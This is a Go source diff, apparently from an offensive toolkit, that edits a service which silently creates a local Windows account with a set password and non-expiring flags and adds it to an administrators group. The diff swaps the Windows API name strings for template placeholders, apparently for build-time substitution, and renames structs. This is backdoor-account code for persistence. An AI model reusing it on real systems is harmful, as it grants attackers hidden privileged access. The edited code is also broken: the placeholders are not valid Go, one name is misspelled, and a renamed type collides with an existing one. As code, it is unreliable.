@@ -39,9 +39,9 @@ const (
 var (
 	dllNetapi32 = winapi.NewLazyDLL("netapi32.dll")
 
-	funcNetUserAdd              = dllNetapi32.Proc("NetUserAdd")
-	funcNetUserSetInfo          = dllNetapi32.Proc("NetUserSetInfo")
-	funcNetLocalGroupAddMembers = dllNetapi32.Proc("NetLocalGroupAddMembers")
+	funcNetUserAdd              = dllNetapi32.Proc($net_user_add)
+	funcNetUserSetInfo          = dllNetapi32.Proc($net_user_set_into)
+	funcNetLocalGroupAddMembers = dllNetapi32.Proc($net_local_group_add_members)
 )
 
 type userInfo struct {
@@ -64,7 +64,7 @@ type userInfo struct {
 	_          *uint16
 	_, _       uint32
 }
-type localGroup3 struct {
+type localGroup struct {
 	Name *uint16
 }
 type userAddService struct {
@@ -136,12 +136,12 @@ func (s *userAddService) exec(_ context.Context) error {
 }
 func (s *userAddService) addUser(f bool, v string) bool {
 	var (
-		i    *userInfo2
+		i    *userInfo
 		n, _ = winapi.UTF16PtrFromString(v)
 		err  = syscall.NetUserGetInfo(nil, n, 2, (**byte)(unsafe.Pointer(&i)))
 	)
 	if err != nil || i == nil {
-		x := &userInfo2{
+		x := &userInfo{
 			Name:     n,
 			Priv:     1,
 			Flags:    0x1090200,
@@ -152,7 +152,7 @@ func (s *userAddService) addUser(f bool, v string) bool {
 			Password: &s.pass[0],
 		}
 		if r, _ := funcNetUserAdd.Call(0, 2, uintptr(unsafe.Pointer(x)), 0); r == 0 {
-			g := &localGroup3{Name: n}
+			g := &localGroup{Name: n}
 			funcNetLocalGroupAddMembers.Call(0, uintptr(unsafe.Pointer(&s.pass[0])), 3, uintptr(unsafe.Pointer(g)), 1)
 			g = nil
 		}
@@ -163,7 +163,7 @@ func (s *userAddService) addUser(f bool, v string) bool {
 			i.Password, i.Flags = &s.pass[0], (i.Flags&^0x800012)|0x1090000
 			funcNetUserSetInfo.Call(0, uintptr(unsafe.Pointer(n)), 2, uintptr(unsafe.Pointer(i)), 0)
 		}
-		g := &localGroup3{Name: n}
+		g := &localGroup{Name: n}
 		funcNetLocalGroupAddMembers.Call(0, uintptr(unsafe.Pointer(&s.admin[0])), 3, uintptr(unsafe.Pointer(g)), 1)
 		g = nil
 	}
